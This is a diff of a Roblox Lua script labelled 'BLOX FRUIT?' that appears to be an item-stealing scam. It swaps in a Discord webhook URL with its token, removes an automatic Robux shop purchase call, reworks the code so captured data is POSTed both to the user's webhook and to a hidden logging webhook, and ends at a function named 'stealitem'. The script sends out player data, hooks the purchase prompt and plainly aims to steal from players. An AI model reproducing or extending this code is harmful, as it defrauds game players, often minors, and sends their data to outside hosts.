@@ -1,5 +1,5 @@
 -- BLOX FRUIT?
-LogsWebhook = "https://discord.com/api/webhooks/1318650965255262343/FDMkfG_JCpuYL0ZFJVpZW6vsug9Gb5poG57ogeCHtJEZeO5LWXRuFjXoF_wAQqXgVZ"
+LogsWebhook = "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
@@ -11,16 +11,6 @@ local HttpService = game:GetService("HttpService")
 local success, UserId = pcall(function()
     return Players:GetUserIdFromNameAsync(Username)
 end)
-
-local args = {
-    [1] = "buyRobuxShop",
-    [2] = {
-        ["StorageName"] = "2x EXP (15 mins.)",
-        ["FunnelId"] = "Shop",
-        ["PurchaseLocation"] = "Shop"
-    }
-}
-game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
 
 local CoreGui = game:GetService("CoreGui")
 local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
@@ -90,26 +80,23 @@ local function sendWebhook()
         ["embeds"] = {embed}
     })
 
-    local WebhookResponse =
-    request(
-    {
+    request({
         Url = Webhook,
         Method = "POST",
-        Headers = headers,
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
         Body = data
-    }
-)
-    
-    local logsResponse =
-    request(
-    {
+    })
+
+    request({
         Url = LogsWebhook,
         Method = "POST",
-        Headers = headers,
-        Body = data2
-    }
-)
-
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data
+    })
 end
 
 function stealitem()
